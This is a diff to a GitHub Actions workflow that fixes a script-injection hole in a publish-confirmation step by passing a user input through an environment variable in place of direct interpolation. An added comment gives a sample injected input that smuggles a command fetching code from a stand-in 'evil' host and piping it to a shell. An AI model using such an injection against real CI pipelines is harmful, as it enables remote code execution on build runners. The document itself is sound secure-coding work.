@@ -24,10 +24,16 @@ jobs:
     steps:
       - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
 
+      # The input is passed through `env:` rather than interpolated into the script body.
+      # `${{ }}` inside a `run:` block is substituted before the shell ever sees it, so an
+      # input of `x"; curl evil|sh; #` executes as shell on this runner. Via env it is
+      # inert data.
       - name: Require explicit confirmation
+        env:
+          CONFIRM: ${{ github.event.inputs.confirm }}
         run: |
-          if [ "${{ github.event.inputs.confirm }}" != "PUBLISH" ]; then
-            echo "Refusing to publish: the 'confirm' input must be exactly 'PUBLISH' (got '${{ github.event.inputs.confirm }}')." >&2
+          if [ "$CONFIRM" != "PUBLISH" ]; then
+            echo "Refusing to publish: the 'confirm' input must be exactly 'PUBLISH' (got '$CONFIRM')." >&2
             exit 1
           fi
 
